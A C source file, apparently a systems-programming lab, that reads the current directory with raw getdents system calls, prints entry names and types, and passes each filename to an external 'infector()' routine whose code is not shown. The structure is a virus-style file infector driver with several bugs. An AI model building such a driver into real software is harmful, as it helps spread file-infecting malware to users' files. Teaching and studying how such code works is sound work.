#include "dirent.h"
#include "util.h"

#define exit 1
#define SYS_READ 3
#define SYS_WRITE 4
#define STDIN 0
#define STDOUT 1
#define STDERR 2
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_ISEEK 19
#define read 0
#define write 1
#define read_and_write 2
#define eof -1
#define MAX_SIZE 8192


extern int system_call();
extern void infector();
typedef struct ent
{
    int inode;    /* Inode number */
    int offset;   /* Offset to next linux_dirent */
    short len;    /* Length of this linux_dirent */
    char name[1]; /* Filename (null-terminated) */
} ent;

void typePrinter(int c)
{
    char *string;

    switch (c)
    {
    case 0:
        string = "UNKNOWN";
        break;
    case 1:
        string = "DT_FIFO";
        break;
    case 2:
        string = "DT_CHR";
        break;

    case 4:
        string = "DT_DIR";
        break;

    case 6:
        string = "DT_BLK";
        break;

    case 8:
        string = "DT_REG";
        break;

    case 10:
        string = "DT_LNK";
        break;

    case 12:
        string = "DT_SOCK";
        break;
    case 14:
        string = "DT_WHT";
        break;
    }

    system_call(SYS_WRITE, STDOUT, string, strlen(string));
}


int main(int argc, char *argv[])
{
    int pmode = 0 ,amode = 0, i;
    char *prefix;
    for (i = 1; i < argc; i++)
    {
        if (!strncmp(argv[i], "-p", 2))
        {
            pmode = 1;
            prefix = argv[i] + 2;
        }
        else if (!strncmp(argv[i], "-a", 2))
        {
            amode = 1;
    
        }
        else
        {
            system_call(exit, 0x55);
        }
    }
    char buff[MAX_SIZE];
    ent *ptr = (ent *)buff;
    int fd = system_call(SYS_OPEN, ".", read, 0644);
    if (fd < 0)
    {
        system_call(exit, 0x55);
    }
    int readCount = 0;
    readCount = system_call(141, fd, buff, MAX_SIZE);
    int currRead = 0;
    while (currRead < readCount)
    {
        ptr = (ent *)(buff + currRead);
        if (!strncmp(ptr->name, ".", 1) || !strncmp(ptr->name, "..", 2))
        {
            currRead += ptr->len;
            continue;
        }
        if (!pmode || (pmode && !strncmp(ptr->name, prefix, 1)))
        {   
            infector(ptr->name);
            system_call(SYS_WRITE, STDOUT, ptr->name, strlen(ptr->name) + 2);
            system_call(SYS_WRITE, STDOUT, "\t\t", 3);
            if (pmode)
            {
                int data_type = *(buff + currRead + ptr->len - 1);
                typePrinter(data_type);
            }
            system_call(SYS_WRITE, STDOUT, "\n", 2);
        }
        currRead += ptr->len;
    }
    system_call(SYS_CLOSE, fd);

    return 0;
}
